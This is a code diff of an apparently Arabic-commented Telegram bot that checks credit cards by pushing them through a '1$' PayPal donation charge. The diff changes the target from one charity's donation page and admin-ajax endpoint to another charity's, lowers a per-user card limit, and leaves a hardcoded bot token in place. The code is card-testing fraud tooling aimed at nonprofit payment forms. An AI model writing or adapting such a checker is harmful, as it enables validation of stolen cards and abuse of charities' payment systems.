@@ -6,7 +6,7 @@ import string
 BOT_TOKEN = "8787566674:AAGY66cyvKfkRJ9MmdQmE79WW1TsACiE6hQ"
 ADMIN_ID = 1093032296  # غير ده بإيديك انت
 active_scans = {}
-MAX_CARDS_PER_USER = 5000
+MAX_CARDS_PER_USER = 1000
 
 # ==================== الأسماء المزخرفة ====================
 GATEWAY_DISPLAY = "𝚙𝚊𝚢𝚙𝚊𝚕 𝚌𝚞𝚜𝚝𝚘𝚖 𝚌𝚑𝚊𝚛𝚐𝚎 𝟷$"
@@ -230,8 +230,8 @@ def look(cc_line):
     user = generate_user_agent()
     
     try:
-        url = 'https://www.lapovertydept.org/donate/'
-        url_ajax = 'https://www.lapovertydept.org/wordpress/wp-admin/admin-ajax.php'
+        url = 'https://beingkid.org/donations/sponsorship-opportunities-for-classes-events/'
+        url_ajax = 'https://beingkid.org/wordpress/wp-admin/admin-ajax.php'
         
         headers = {'user-agent': user}
         r = s.get(url, headers=headers)
